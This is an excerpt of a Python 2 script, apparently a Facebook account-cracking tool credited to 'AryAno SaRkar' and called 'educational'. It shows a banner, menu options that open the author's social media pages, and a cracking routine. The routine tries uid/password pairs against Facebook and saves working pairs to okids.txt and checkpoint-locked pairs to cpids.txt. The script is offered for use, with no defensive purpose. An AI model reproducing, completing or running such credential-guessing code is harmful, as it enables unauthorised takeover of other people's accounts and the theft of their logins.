#Script Given By AryAno SaRkar
#Script Is Given For Educational Purpose
#Script Edited By @AryAno SaRkar
#Utf-8 python 
...
AryAno = ['Op Bolty','Good Jani','Keep It Up ','Wah Bhai','Kia Baat Hy ','Aag Lga Di','Tu Baqio Sy Alag Hy Vro','Agar May Larki Hota Toh Tuj sy Shaadi Krta ','Ha Chikny Lub u']
AryAnochoice = random.choice(AryAno)
agents = [
...
┗━━━┻━━┻━━┻━━┛┗┛
\n\033[0m-----------------------------------------
\033[1;92mAuthor \033[1;93m: AryAno SaRkar
\033[1;92mFb \033[1;93m: AryAno SaRkar
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-open https://www.facebook.com/UnDeRwOrLdGuNdA.AryAno')
        main()
    elif select == '0':
        os.system('exit')
    elif select == '3':
        os.system('xdg-open https://youtube.com/channel/UCBpFPkicA-DxI6ZxdnBJ0MA')
        main()
    else:
        print ''
...
def crack_select():
    ...
    print ' \x1b[1;94m  Wait Ids Will Appear Here \033[0m'#Thanks TechAryAno
    print 45 * '_'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[ARYANO-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('okids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;31m[ARYANO-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cpids.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
